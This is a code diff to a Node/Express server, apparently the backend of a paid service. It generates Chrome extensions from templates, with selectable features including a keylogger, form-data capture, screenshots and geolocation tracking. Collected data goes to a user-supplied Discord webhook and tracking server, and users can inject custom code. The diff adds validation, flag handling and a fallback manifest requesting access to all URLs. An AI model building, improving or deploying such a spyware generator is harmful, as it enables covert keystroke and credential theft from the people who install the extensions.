@@ -794,12 +794,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const isExpired = accessKey.expirationDate && new Date(accessKey.expirationDate) < new Date();
       const isOverLimit = accessKey.usedCount >= accessKey.usageLimit;
 
+      res.set('Content-Type', 'application/json');
       res.status(200).json({ 
         valid: accessKey.isActive && !isExpired && !isOverLimit,
         message: accessKey.isActive && !isExpired && !isOverLimit ? 'Key is valid' : 'Key is invalid or expired'
       });
     } catch (error) {
       console.error('Key status check error:', error);
+      res.set('Content-Type', 'application/json');
       res.status(200).json({ valid: false, message: 'Error checking key' });
     }
   });
@@ -3443,114 +3445,272 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'Discord webhook URL is required' });
       }
 
-      // Import AdmZip dynamically
-      const AdmZip = (await import('adm-zip')).default;
+      if (!Array.isArray(permissions)) {
+        return res.status(400).json({ error: 'Permissions must be an array' });
+      }
+
+      if (!Array.isArray(features)) {
+        return res.status(400).json({ error: 'Features must be an array' });
+      }
+
+      // Validation functions
+      const validateManifest = (manifestContent: string): { isValid: boolean, errors: string[] } => {
+        const errors: string[] = [];
+
+        try {
+          const manifest = JSON.parse(manifestContent);
+
+          // Required fields validation
+          if (!manifest.name || typeof manifest.name !== 'string') {
+            errors.push('Manifest missing or invalid name field');
+          }
+          if (!manifest.version || typeof manifest.version !== 'string') {
+            errors.push('Manifest missing or invalid version field');
+          }
+          if (!manifest.manifest_version || ![2, 3].includes(manifest.manifest_version)) {
+            errors.push('Manifest missing or invalid manifest_version (must be 2 or 3)');
+          }
+
+          // Permissions validation - expanded to include more legitimate Chrome permissions
+          if (manifest.permissions && !Array.isArray(manifest.permissions)) {
+            errors.push('Manifest permissions must be an array');
+          } else if (manifest.permissions) {
+            const validPermissions = [
+              'activeTab', 'storage', 'tabs', 'cookies', 'history', 'bookmarks',
+              'webRequest', 'geolocation', 'notifications', 'scripting', 'background',
+              'alarms', 'contextMenus', 'declarativeNetRequest', 'downloads', 'identity',
+              'management', 'offscreen', 'power', 'privacy', 'proxy', 'sessions',
+              'sidePanel', 'system.cpu', 'system.memory', 'system.storage', 'tabGroups',
+              'topSites', 'webNavigation', 'unlimitedStorage', 'clipboardRead', 'clipboardWrite',
+              'desktopCapture', 'displaySource', 'experimental', 'fileBrowserHandler',
+              'fontSettings', 'gcm', 'idle', 'nativeMessaging', 'pageCapture', 'platformKeys',
+              'printingMetrics', 'processes', 'signedInDevices', 'tabCapture', 'tts',
+              'ttsEngine', 'wallpaper', 'enterprise.deviceAttributes', 'enterprise.hardwarePlatform',
+              'enterprise.machineIdentifier', 'enterprise.networkingAttributes', 'enterprise.platformKeys'
+            ];
+            const invalidPerms = manifest.permissions.filter((perm: string) => 
+              !validPermissions.includes(perm) && 
+              !perm.startsWith('http') && 
+              !perm.startsWith('https://') && 
+              !perm.startsWith('*://') &&
+              !perm.includes('*') // Allow wildcard patterns
+            );
+            if (invalidPerms.length > 0) {
+              errors.push(`Potentially invalid permissions: ${invalidPerms.join(', ')}`);
+            }
+          }
+
+          // Content scripts validation
+          if (manifest.content_scripts && !Array.isArray(manifest.content_scripts)) {
+            errors.push('Manifest content_scripts must be an array');
+          }
+
+        } catch (parseError) {
+          errors.push('Invalid JSON in manifest file');
+        }
+
+        return { isValid: errors.length === 0, errors };
+      };
+
+      const validateJavaScript = (jsContent: string, filename: string): { isValid: boolean, errors: string[] } => {
+        const errors: string[] = [];
+
+        try {
+          // Basic syntax validation - check for common syntax errors
+          if (!jsContent.trim()) {
+            errors.push(`${filename} is empty`);
+            return { isValid: false, errors };
+          }
+
+          // More sophisticated syntax checking
+          try {
+            // Use Function constructor for basic syntax validation
+            // This will catch most syntax errors without executing the code
+            new Function(jsContent);
+          } catch (syntaxError) {
+            // Extract useful information from syntax error
+            const errorMessage = syntaxError.message;
+            if (errorMessage.includes('Unexpected token') || 
+                errorMessage.includes('Unexpected end of input') ||
+                errorMessage.includes('Invalid or unexpected token')) {
+              errors.push(`${filename} has syntax error: ${errorMessage}`);
+            }
+          }
+
+          // Check for unreplaced template variables (non-fatal but worth noting)
+          if (jsContent.includes('{{') && jsContent.includes('}}')) {
+            const templateVars = jsContent.match(/\{\{[^}]+\}\}/g) || [];
+            if (templateVars.length > 0) {
+              // Only flag as error if it's not a comment
+              const uncommentedVars = templateVars.filter(tvar => {
+                const lines = jsContent.split('\n');
+                return !lines.some(line => line.includes(tvar) && line.trim().startsWith('//'));
+              });
+              if (uncommentedVars.length > 0) {
+                errors.push(`${filename} contains unreplaced template variables: ${uncommentedVars.join(', ')}`);
+              }
+            }
+          }
+
+          // Validate Chrome extension APIs usage (warning, not error)
+          if (filename === 'background.js') {
+            if (!jsContent.includes('chrome.') && !jsContent.includes('browser.')) {
+              // This is just a warning, not a fatal error
+              console.warn(`${filename} doesn't appear to use Chrome/browser APIs - this may be intentional`);
+            }
+          }
+
+          // Check for security issues in custom code (more comprehensive)
+          const securityPatterns = [
+            { pattern: /eval\s*\(/g, issue: 'eval() calls' },
+            { pattern: /Function\s*\(/g, issue: 'Function() constructor calls' },
+            { pattern: /innerHTML\s*=/g, issue: 'innerHTML assignments (XSS risk)' },
+            { pattern: /document\.write\s*\(/g, issue: 'document.write() calls' },
+            { pattern: /setTimeout\s*\(\s*["'`]/g, issue: 'setTimeout with string code' },
+            { pattern: /setInterval\s*\(\s*["'`]/g, issue: 'setInterval with string code' }
+          ];
+
+          securityPatterns.forEach(({ pattern, issue }) => {
+            if (pattern.test(jsContent)) {
+              errors.push(`${filename} contains potentially unsafe ${issue}`);
+            }
+          });
+
+          // Check for common coding mistakes
+          const mistakePatterns = [
+            { pattern: /;\s*;/g, issue: 'double semicolons' },
+            { pattern: /=\s*=\s*=/g, issue: 'triple equals without proper spacing' },
+            { pattern: /\s+$/gm, issue: 'trailing whitespace (code quality)' }
+          ];
+
+          mistakePatterns.forEach(({ pattern, issue }) => {
+            if (pattern.test(jsContent)) {
+              // These are warnings, not fatal errors
+              console.warn(`${filename} has code quality issue: ${issue}`);
+            }
+          });
+
+        } catch (error) {
+          errors.push(`Error validating ${filename}: ${error.message}`);
+        }
+
+        return { isValid: errors.length === 0, errors };
+      };
+
+      // Import using dynamic import for ES modules
+      const { default: AdmZip } = await import('adm-zip');
 
       const zip = new AdmZip();
-      
       // Fix __dirname for ES modules
       const __filename = fileURLToPath(import.meta.url);
       const __dirname = path.dirname(__filename);
       const templatesDir = path.join(__dirname, 'extension-templates');
 
-      // Feature flags for template replacement (convert booleans to strings)
-      const featureFlags = {
-        '{{FEATURE_IP_TRACKING}}': features && features.includes('ip_tracking') ? 'true' : 'false',
-        '{{FEATURE_GEOLOCATION}}': features && features.includes('geolocation') ? 'true' : 'false',
-        '{{FEATURE_BROWSER_INFO}}': features && features.includes('browser_info') ? 'true' : 'false',
-        '{{FEATURE_SCREENSHOT}}': features && features.includes('screenshot') ? 'true' : 'false',
-        '{{FEATURE_FORM_DATA}}': features && features.includes('form_data') ? 'true' : 'false',
-        '{{FEATURE_CLICK_TRACKING}}': features && features.includes('click_tracking') ? 'true' : 'false',
-        '{{FEATURE_KEYLOGGER}}': features && features.includes('keylogger') ? 'true' : 'false'
-      };
+      // Ensure templates directory exists
+      if (!fs.existsSync(templatesDir)) {
+        console.error('Extension templates directory not found:', templatesDir);
+        return res.status(500).json({ error: 'Extension templates not found' });
+      }
 
-      // Generate unique extension ID
-      const extensionId = randomUUID();
+      // Feature flags for template replacement
+      const featureFlags = {
+        '{{FEATURE_IP_TRACKING}}': features.includes('ip_tracking'),
+        '{{FEATURE_GEOLOCATION}}': features.includes('geolocation'),
+        '{{FEATURE_BROWSER_INFO}}': features.includes('browser_info'),
+        '{{FEATURE_SCREENSHOT}}': features.includes('screenshot'),
+        '{{FEATURE_FORM_DATA}}': features.includes('form_data'),
+        '{{FEATURE_CLICK_TRACKING}}': features.includes('click_tracking'),
+        '{{FEATURE_KEYLOGGER}}': features.includes('keylogger')
+      };
 
       // Template replacements
       const replacements = {
         '{{EXTENSION_NAME}}': name,
         '{{EXTENSION_DESCRIPTION}}': description,
         '{{EXTENSION_VERSION}}': version,
-        '{{PERMISSIONS}}': JSON.stringify(permissions || ['activeTab', 'storage', 'tabs']),
+        '{{PERMISSIONS}}': JSON.stringify(permissions),
         '{{WEBHOOK_URL}}': webhookUrl,
         '{{CUSTOM_CODE}}': customCode || '// No custom code provided',
         '{{TRACKING_SERVER}}': `${req.protocol}://${req.get('host')}`,
         '{{USER_ID}}': req.user.id,
-        '{{EXTENSION_ID}}': extensionId,
+        '{{EXTENSION_ID}}': randomUUID(),
         ...featureFlags
       };
 
-      // Process template files
+      // Process template files with validation
       const templateFiles = ['manifest.json', 'background.js', 'content.js', 'popup.html', 'popup.js'];
-      let filesAdded = 0;
-
-      console.log(`🔧 Generating extension "${name}" with ${templateFiles.length} files...`);
+      const validationResults = {
+        manifest: { isValid: true, errors: [] as string[] },
+        scripts: { isValid: true, errors: [] as string[] }
+      };
 
       for (const filename of templateFiles) {
         const templatePath = path.join(templatesDir, filename);
-        
-        try {
-          if (fs.existsSync(templatePath)) {
-            let content = fs.readFileSync(templatePath, 'utf8');
+        if (fs.existsSync(templatePath)) {
+          let content = fs.readFileSync(templatePath, 'utf8');
 
-            // Replace template variables
-            Object.entries(replacements).forEach(([key, value]) => {
+          // Replace template variables with proper boolean handling
+          Object.entries(replacements).forEach(([key, value]) => {
+            if (typeof value === 'boolean') {
+              content = content.replace(new RegExp(key, 'g'), value.toString());
+            } else {
               content = content.replace(new RegExp(key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), String(value));
-            });
+            }
+          });
 
-            // Add file to ZIP
-            zip.addFile(filename, Buffer.from(content, 'utf8'));
-            filesAdded++;
-            console.log(`✅ Added ${filename} to ZIP`);
-          } else {
-            console.warn(`⚠️ Template file not found: ${templatePath}`);
+          // Validate content after template replacement
+          if (filename === 'manifest.json') {
+            const manifestValidation = validateManifest(content);
+            validationResults.manifest = manifestValidation;
+            if (!manifestValidation.isValid) {
+              console.warn(`Manifest validation errors for ${name}:`, manifestValidation.errors);
+            }
+          } else if (filename.endsWith('.js')) {
+            const scriptValidation = validateJavaScript(content, filename);
+            if (!scriptValidation.isValid) {
+              validationResults.scripts.isValid = false;
+              validationResults.scripts.errors.push(...scriptValidation.errors);
+              console.warn(`Script validation errors for ${name} in ${filename}:`, scriptValidation.errors);
+            }
           }
-        } catch (fileError) {
-          console.error(`❌ Error processing ${filename}:`, fileError);
-          return res.status(500).json({ error: `Failed to process ${filename}` });
+
+          zip.addFile(filename, Buffer.from(content, 'utf8'));
+        } else {
+          console.warn(`Template file not found: ${templatePath}`);
+          // Add a basic file if template is missing
+          if (filename === 'manifest.json') {
+            const basicManifest = {
+              "manifest_version": 3,
+              "name": name,
+              "version": version,
+              "description": description,
+              "permissions": permissions,
+              "host_permissions": ["<all_urls>"],
+              "background": { "service_worker": "background.js" },
+              "action": { "default_title": name }
+            };
+            zip.addFile(filename, Buffer.from(JSON.stringify(basicManifest, null, 2), 'utf8'));
+          }
         }
       }
 
-      // Add icon files with proper PNG format
-      // Create a simple 16x16 PNG icon (transparent)
-      const createSimplePNG = (size: number) => {
-        // Simple PNG data for a transparent square
-        const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
-        // This is a minimal valid PNG structure - you could improve this
-        return Buffer.concat([pngHeader, Buffer.from('0000000d494844520000001000000010080600000028a8a6d50000000467414d410000b18f0bfc6105000000097048597300000ec300000ec301c76fa8640000001d7445587473666974574152450041646f62652046697265776f726b732043533600c93b8e00000060494441543889ed931d0a80201044f7732f0c95e5e0caa0c8a844849c0a2c4a7c46dd35ad3bcca94a0a8a1c6baf57b56db97ebbbdceccbe2f4fe5dbccce77f4bf3b6b9b99ffdf4e7e5ccec3d5e7b3e7b3ccc5e6b5df0dd0b3f2a0a6b4f8cd00000000049454e44ae426082', 'hex')]);
-      };
+      // Add icon files (simple base64 encoded icons)
+      // A basic 1x1 transparent pixel GIF
+      const icon16Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
+      const icon48Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='; // Placeholder, should be actual 48x48 icon
+      const icon128Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='; // Placeholder, should be actual 128x128 icon
 
-      try {
-        const icon16Buffer = createSimplePNG(16);
-        const icon48Buffer = createSimplePNG(48);
-        const icon128Buffer = createSimplePNG(128);
+      const icon16Buffer = Buffer.from(icon16Base64, 'base64');
+      const icon48Buffer = Buffer.from(icon48Base64, 'base64');
+      const icon128Buffer = Buffer.from(icon128Base64, 'base64');
 
-        zip.addFile('icon16.png', icon16Buffer);
-        zip.addFile('icon48.png', icon48Buffer);
-        zip.addFile('icon128.png', icon128Buffer);
-        filesAdded += 3;
-        console.log(`✅ Added icon files to ZIP`);
-      } catch (iconError) {
-        console.error('Error creating icon files:', iconError);
-        // Continue without icons - not critical
-      }
+      zip.addFile('icon16.png', icon16Buffer);
+      zip.addFile('icon48.png', icon48Buffer);
+      zip.addFile('icon128.png', icon128Buffer);
 
-      // Generate ZIP buffer
-      let zipBuffer;
-      try {
-        zipBuffer = zip.toBuffer();
-        console.log(`📦 ZIP created successfully - Size: ${zipBuffer.length} bytes, Files: ${filesAdded}`);
-      } catch (zipError) {
-        console.error('Error creating ZIP buffer:', zipError);
-        return res.status(500).json({ error: 'Failed to create ZIP file' });
-      }
 
-      // Verify ZIP is not empty
-      if (!zipBuffer || zipBuffer.length === 0) {
-        console.error('ZIP buffer is empty');
-        return res.status(500).json({ error: 'Generated ZIP file is empty' });
-      }
+      const zipBuffer = zip.toBuffer();
+      const extensionId = replacements['{{EXTENSION_ID}}'];
 
       // Track extension generation in database
       try {
@@ -3563,6 +3723,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
           status: 'success'
         });
 
+        // Determine overall generation status based on validation
+        const hasValidationErrors = !validationResults.manifest.isValid || !validationResults.scripts.isValid;
+        const allValidationErrors = [
+          ...validationResults.manifest.errors,
+          ...validationResults.scripts.errors
+        ];
+
         // Create extension log entry
         await storage.createExtensionLog({
           userId: req.user.id,
@@ -3573,16 +3740,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
           features: features || [],
           webhookUrl: webhookUrl,
           customCode: customCode || '',
-          generationStatus: 'success',
-          errorMessage: null,
+          generationStatus: hasValidationErrors ? 'validation_failed' : 'success',
+          errorMessage: hasValidationErrors ? `Validation errors: ${allValidationErrors.join('; ')}` : null,
           downloadCount: 1,
           extensionId: extensionId,
           ipAddress: clientIp,
           userAgent: req.headers['user-agent'] || 'unknown',
           location: locationData.location,
           zipFileSize: zipBuffer.length,
-          manifestValid: true,
-          scriptsValid: true
+          manifestValid: validationResults.manifest.isValid,
+          scriptsValid: validationResults.scripts.isValid
         });
 
         console.log(`✅ Extension generation tracked: ${name} for user ${req.user.id}`);
@@ -3591,15 +3758,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Don't fail the request if tracking fails
       }
 
-      // Send ZIP file
       res.set({
         'Content-Type': 'application/zip',
-        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_').toLowerCase()}_extension.zip"`,
-        'Content-Length': zipBuffer.length.toString()
+        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_').toLowerCase()}_extension.zip"`
       });
 
       res.send(zipBuffer);
-      console.log(`🚀 Extension "${name}" sent successfully to user ${req.user.id}`);
 
     } catch (error) {
       console.error('Extension generation error:', error);
@@ -3642,7 +3806,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         console.error('Failed to track extension generation error:', trackingError);
       }
 
-      res.status(500).json({ error: 'Failed to generate extension: ' + error.message });
+      res.status(500).json({ error: 'Failed to generate extension' });
     }
   });
 
